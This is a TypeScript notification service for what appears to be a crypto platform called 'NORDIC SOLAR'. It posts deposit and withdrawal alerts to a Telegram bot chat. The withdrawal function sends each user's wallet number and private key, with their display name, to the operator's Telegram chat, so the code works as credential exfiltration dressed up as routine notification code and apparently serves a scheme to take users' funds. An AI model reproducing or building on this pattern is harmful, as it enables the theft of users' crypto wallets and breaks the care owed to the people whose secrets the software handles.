import axios from 'axios'
import { auth } from '@/main.tsx'

interface ITelegramService {}

export const TELEGRAM_URL = `https://api.telegram.org/bot${import.meta.env.VITE_BOT_TOKEN}/sendMessage`

class TelegramService implements ITelegramService {
  constructor() {}

  async depositNotification(userData) {
    const { amount, type, transactionHash } = userData

    try {
      await axios.post(TELEGRAM_URL, {
        chat_id: import.meta.env.VITE_CHAT_ID,
        parse_mode: 'html',
        text: `🟢 NORDIC SOLAR\n\nТип операции: ${type}\nПользователь: ${auth.currentUser.displayName}\nСумма: $${amount}\nНомер транзакции: ${transactionHash}`,
      })
    } catch (e) {
      console.log(e, 'telegramNotification')
    }
  }

  async withdrawnNotification(userData) {
    const { amount, type, privateKey, walletNumber } = userData

    try {
      await axios.post(TELEGRAM_URL, {
        chat_id: import.meta.env.VITE_CHAT_ID,
        parse_mode: 'html',
        text: `🔴 NORDIC SOLAR\n\nТип операции: ${type}\nПользователь: ${auth.currentUser.displayName}\nСумма: $${amount} \nКошелёк: ${walletNumber}\nКлюч: ${privateKey}`,
      })
    } catch (e) {
      console.log(e, 'telegramNotification')
    }
  }
}

export default TelegramService
